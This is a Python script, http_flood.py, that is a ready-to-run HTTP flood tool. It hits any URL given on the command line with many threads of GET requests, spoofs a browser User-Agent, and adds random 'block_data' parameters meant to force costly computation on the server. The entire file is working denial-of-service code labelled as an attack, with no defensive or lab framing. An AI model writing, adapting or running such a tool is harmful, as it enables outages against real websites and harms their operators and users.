# http_flood.py

import requests
import threading
import time
import sys
import random
import string

# --- Configuration ---
# Get target URL from command-line arguments
if len(sys.argv) < 2:
    print("Usage: python http_flood.py <URL> [thread_count]")
    sys.exit(1)

target_url = sys.argv[1]
# Get thread count from command-line or use default
thread_count = int(sys.argv[2]) if len(sys.argv) > 2 else 100

print(f"Attacking {target_url} with {thread_count} threads.")

# This user agent makes the request look like it's from a real browser
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}

# Global counter for successful requests
successful_requests = 0
running = True

def generate_random_block_data():
    """
    Generates a random scrambled string and send it to the server.
    This ensures each request requires unique computational work on the server.
    """
    # Generate random length between 20-100 characters
    length = random.randint(20, 100)
    
    # Mix of letters, numbers, and some special characters
    chars = string.ascii_letters + string.digits + '_-.'
    
    # Generate random string
    random_data = ''.join(random.choice(chars) for _ in range(length))
    
    # Add some realistic blockchain-like prefixes occasionally
    prefixes = ['block_', 'tx_', 'data_', 'hash_', 'chain_']
    if random.random() < 0.3:  # 30% chance to add prefix
        random_data = random.choice(prefixes) + random_data
    
    return random_data

def attack():
    """
    The main attack function.
    It sends GET requests with randomized block_data to force unique computational work on the server.
    """
    global successful_requests
    while running:
        try:
            # Generate random block data for this request
            block_data = generate_random_block_data()
            
            # Send GET request with block_data parameter to force server computation
            params = {'block_data': block_data}
            response = requests.get(target_url, headers=headers, params=params, timeout=10)
            
            # We consider any 2xx or 3xx status code a "success"
            if 200 <= response.status_code < 400:
                successful_requests += 1
                # Occasionally print successful computation details
                if successful_requests % 50 == 0:
                    try:
                        result = response.json()
                        print(f"Server computed: Block={result.get('block_data', '')[:20]}..., Nonce={result.get('nonce', 'N/A')}")
                    except:
                        pass

        except requests.exceptions.RequestException:
            # This will catch timeouts, connection errors, etc.
            pass

def print_stats():
    """
    Prints the number of requests per second.
    """
    global successful_requests
    last_count = 0
    while running:
        time.sleep(1)
        # Calculate requests per second
        requests_per_second = successful_requests - last_count
        print(f"Requests/sec: {requests_per_second}")
        last_count = successful_requests

if __name__ == "__main__":
    threads = []
    
    # Start the statistics thread
    stats_thread = threading.Thread(target=print_stats, daemon=True)
    stats_thread.start()

    # Start the attacker threads
    for i in range(thread_count):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    # Keep the main thread alive, and handle Ctrl+C to stop
    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("\nStopping attack...")
        running = False
        # Give threads a moment to stop
        time.sleep(1) 
        print("Attack finished.")